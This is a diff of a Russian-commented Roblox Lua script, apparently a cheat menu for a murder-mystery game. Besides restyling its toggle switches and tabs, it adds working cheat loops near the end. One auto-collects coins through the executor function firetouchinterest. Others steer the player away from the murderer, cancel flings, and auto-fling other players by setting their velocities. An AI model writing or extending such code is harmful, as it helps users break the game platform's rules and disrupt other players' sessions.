+    descLabel.TextColor3 = colors.textDim
+    descLabel.TextSize = 9
+    descLabel.TextXAlignment = Enum.TextXAlignment.Left
 
-    -- Иконка-индикатор
-    local Indicator = Instance.new("Frame")
-    Indicator.Parent = ToggleCard
-    Indicator.BackgroundColor3 = tog.default and colors.green or colors.red
-    Indicator.BorderSizePixel = 0
-    Indicator.Position = UDim2.new(0, 10, 0, 12)
-    Indicator.Size = UDim2.new(0, 8, 0, 8)
+    local switch = Instance.new("TextButton")
+    switch.Parent = card
+    switch.BackgroundColor3 = tog.default and colors.switchOn or colors.switchOff
+    switch.BorderSizePixel = 0
+    switch.Position = UDim2.new(0.82, 0, 0.2, 0)
+    switch.Size = UDim2.new(0, 38, 0, 20)
+    switch.Text = ""
+    switch.AutoButtonColor = false
+    local switchCorner = Instance.new("UICorner")
+    switchCorner.CornerRadius = UDim.new(0, 10)
+    switchCorner.Parent = switch
 
-    local IndicatorCorner = Instance.new("UICorner")
-    IndicatorCorner.CornerRadius = UDim.new(0, 4)
-    IndicatorCorner.Parent = Indicator
+    local knob = Instance.new("Frame")
+    knob.Parent = switch
+    knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    knob.BorderSizePixel = 0
+    knob.Size = UDim2.new(0, 14, 0, 14)
+    knob.Position = tog.default and UDim2.new(0.5, 0, 0.15, 0) or UDim2.new(0.08, 0, 0.15, 0)
+    local knobCorner = Instance.new("UICorner")
+    knobCorner.CornerRadius = UDim.new(0, 7)
+    knobCorner.Parent = knob
 
-    -- Название
-    local ToggleName = Instance.new("TextLabel")
-    ToggleName.Parent = ToggleCard
-    ToggleName.BackgroundTransparency = 1
-    ToggleName.Position = UDim2.new(0, 26, 0, 4)
-    ToggleName.Size = UDim2.new(0.55, 0, 0, 18)
-    ToggleName.Font = Enum.Font.GothamBold
-    ToggleName.Text = tog.name
-    ToggleName.TextColor3 = colors.text
-    ToggleName.TextSize = 13
-    ToggleName.TextXAlignment = Enum.TextXAlignment.Left
-
-    -- Описание
-    local ToggleDesc = Instance.new("TextLabel")
-    ToggleDesc.Parent = ToggleCard
-    ToggleDesc.BackgroundTransparency = 1
-    ToggleDesc.Position = UDim2.new(0, 26, 0, 20)
-    ToggleDesc.Size = UDim2.new(0.55, 0, 0, 16)
-    ToggleDesc.Font = Enum.Font.Gotham
-    ToggleDesc.Text = tog.desc
-    ToggleDesc.TextColor3 = colors.textDim
-    ToggleDesc.TextSize = 10
-    ToggleDesc.TextXAlignment = Enum.TextXAlignment.Left
-
-    -- Переключатель
-    local Switch = Instance.new("TextButton")
-    Switch.Parent = ToggleCard
-    Switch.BackgroundColor3 = tog.default and colors.switchOn or colors.switchOff
-    Switch.BorderSizePixel = 0
-    Switch.Position = UDim2.new(0.85, 0, 0.22, 0)
-    Switch.Size = UDim2.new(0, 40, 0, 22)
-    Switch.Text = ""
-    Switch.AutoButtonColor = false
-
-    local SwitchCorner = Instance.new("UICorner")
-    SwitchCorner.CornerRadius = UDim.new(0, 11)
-    SwitchCorner.Parent = Switch
-
-    local Knob = Instance.new("Frame")
-    Knob.Parent = Switch
-    Knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    Knob.BorderSizePixel = 0
-    Knob.Size = UDim2.new(0, 16, 0, 16)
-    Knob.Position = tog.default and UDim2.new(0.5, 0, 0.14, 0) or UDim2.new(0.08, 0, 0.14, 0)
-
-    local KnobCorner = Instance.new("UICorner")
-    KnobCorner.CornerRadius = UDim.new(0, 8)
-    KnobCorner.Parent = Knob
-
-    local KnobShadow = Instance.new("UIStroke")
-    KnobShadow.Parent = Knob
-    KnobShadow.Color = Color3.fromRGB(0, 0, 0)
-    KnobShadow.Thickness = 0.5
-    KnobShadow.Transparency = 0.5
-
-    Switch.MouseButton1Click:Connect(function()
+    switch.MouseButton1Click:Connect(function()
         toggleStates[tog.key] = not toggleStates[tog.key]
-        local state = toggleStates[tog.key]
-        if state then
-            TweenService:Create(Switch, TweenInfo.new(0.2), {BackgroundColor3 = colors.switchOn}):Play()
-            TweenService:Create(Knob, TweenInfo.new(0.2), {Position = UDim2.new(0.5, 0, 0.14, 0)}):Play()
-            TweenService:Create(Indicator, TweenInfo.new(0.2), {BackgroundColor3 = colors.green}):Play()
+        if toggleStates[tog.key] then
+            TweenService:Create(switch, TweenInfo.new(0.15), {BackgroundColor3 = colors.switchOn}):Play()
+            TweenService:Create(knob, TweenInfo.new(0.15), {Position = UDim2.new(0.5, 0, 0.15, 0)}):Play()
         else
-            TweenService:Create(Switch, TweenInfo.new(0.2), {BackgroundColor3 = colors.switchOff}):Play()
-            TweenService:Create(Knob, TweenInfo.new(0.2), {Position = UDim2.new(0.08, 0, 0.14, 0)}):Play()
-            TweenService:Create(Indicator, TweenInfo.new(0.2), {BackgroundColor3 = colors.red}):Play()
+            TweenService:Create(switch, TweenInfo.new(0.15), {BackgroundColor3 = colors.switchOff}):Play()
+            TweenService:Create(knob, TweenInfo.new(0.15), {Position = UDim2.new(0.08, 0, 0.15, 0)}):Play()
         end
     end)
 end
 
--- Остальные пустые вкладки
-local emptyTabs = {"Sheriff", "Murderer", "Teleport", "Fun", "Fling", "Settings"}
-for _, tabId in ipairs(emptyTabs) do
-    local EmptyContent = Instance.new("Frame")
-    EmptyContent.Parent = ContentArea
-    EmptyContent.BackgroundTransparency = 1
-    EmptyContent.Size = UDim2.new(1, 0, 1, 0)
-    EmptyContent.Visible = false
-    table.insert(contentFrames, {frame = EmptyContent, id = tabId})
-
-    local ComingSoon = Instance.new("TextLabel")
-    ComingSoon.Parent = EmptyContent
-    ComingSoon.BackgroundTransparency = 1
-    ComingSoon.AnchorPoint = Vector2.new(0.5, 0.5)
-    ComingSoon.Position = UDim2.new(0.5, 0, 0.5, 0)
-    ComingSoon.Size = UDim2.new(0.6, 0, 0, 30)
-    ComingSoon.Font = Enum.Font.GothamBold
-    ComingSoon.Text = "🔒 Скоро..."
-    ComingSoon.TextColor3 = colors.textDim
-    ComingSoon.TextSize = 16
+-- Пустые вкладки
+for _, tabId in ipairs({"Home", "Sheriff", "Murderer", "Teleport", "Fun", "Fling", "Settings"}) do
+    local frame = Instance.new("Frame")
+    frame.Parent = ContentArea
+    frame.BackgroundTransparency = 1
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.Visible = false
+    table.insert(contentFrames, {frame = frame, id = tabId})
+    local label = Instance.new("TextLabel")
+    label.Parent = frame
+    label.BackgroundTransparency = 1
+    label.AnchorPoint = Vector2.new(0.5, 0.5)
+    label.Position = UDim2.new(0.5, 0, 0.5, 0)
+    label.Size = UDim2.new(0.5, 0, 0, 24)
+    label.Font = Enum.Font.GothamBold
+    label.Text = "🔒 Скоро..."
+    label.TextColor3 = colors.textDim
+    label.TextSize = 15
 end
 
 -- Перетаскивание
@@ -671,13 +591,10 @@ Header.InputBegan:Connect(function(input)
         dragStart = input.Position
         startPos = Main.Position
         input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                dragging = false
-            end
+            if input.UserInputState == Enum.UserInputState.End then dragging = false end
         end)
     end
 end)
-
 UserInputService.InputChanged:Connect(function(input)
     if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
         local delta = input.Position - dragStart
@@ -685,21 +602,99 @@ UserInputService.InputChanged:Connect(function(input)
     end
 end)
 
--- Обновление статистики
+-- ==================== РАБОЧИЕ ФУНКЦИИ ====================
 local collectCount = 0
 local sessionTime = 0
 
+-- Автофарм монет
+task.spawn(function()
+    while wait(0.5) do
+        pcall(function()
+            if toggleStates["AutoFarm"] and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                local coins = getCoins()
+                for _, coin in ipairs(coins) do
+                    if coin and coin.Parent then
+                        firetouchinterest(player.Character.HumanoidRootPart, coin, 0)
+                        firetouchinterest(player.Character.HumanoidRootPart, coin, 1)
+                        collectCount = collectCount + 1
+                    end
+                end
+            end
+        end)
+    end
+end)
+
+-- Автореспавн
+task.spawn(function()
+    while wait(0.5) do
+        pcall(function()
+            if toggleStates["AutoRespawn"] then
+                if player.Character and player.Character:FindFirstChild("Humanoid") then
+                    if player.Character.Humanoid.Health <= 0 then
+                        respawn()
+                    end
+                end
+            end
+        end)
+    end
+end)
+
+-- Антифлинг
+task.spawn(function()
+    while wait(0.1) do
+        pcall(function()
+            if toggleStates["AntiFling"] and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                player.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
+                player.Character.HumanoidRootPart.RotVelocity = Vector3.new(0, 0, 0)
+            end
+        end)
+    end
+end)
+
+-- Избегать убийцу
+task.spawn(function()
+    while wait(0.3) do
+        pcall(function()
+            if toggleStates["AvoidMurder"] and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                local murderer = getMurderer()
+                if murderer and murderer.Character and murderer.Character:FindFirstChild("HumanoidRootPart") then
+                    local dist = (player.Character.HumanoidRootPart.Position - murderer.Character.HumanoidRootPart.Position).Magnitude
+                    if dist < 30 then
+                        local dir = (player.Character.HumanoidRootPart.Position - murderer.Character.HumanoidRootPart.Position).Unit
+                        player.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame + dir * 5
+                    end
+                end
+            end
+        end)
+    end
+end)
+
+-- Автофлинг
+task.spawn(function()
+    while wait(0.5) do
+        pcall(function()
+            if toggleStates["AutoFling"] and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                for _, p in ipairs(Players:GetPlayers()) do
+                    if p ~= player and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
+                        local vel = (p.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Unit * 100
+                        vel = vel + Vector3.new(0, 50, 0)
+                        p.Character.HumanoidRootPart.Velocity = vel
+                    end
+                end
+            end
+        end)
+    end
+end)
+
+-- Обновление статистики и FPS
 task.spawn(function()
     while wait(1) do
         pcall(function()
-            if toggleStates["AutoFarm"] then
-                collectCount = collectCount + math.random(1, 3)
-            end
             sessionTime = sessionTime + 1
-
             local mins = math.floor(sessionTime / 60)
             local secs = sessionTime % 60
             SessionLabel.Text = string.format("Session %02d:%02d", mins, secs)
+            FPSLabel.Text = math.floor(1 / RunService.RenderStepped:Wait()) .. " FPS"
 
             statLabels[1].Text = string.format("%dс", sessionTime)
             statLabels[2].Text = tostring(collectCount)
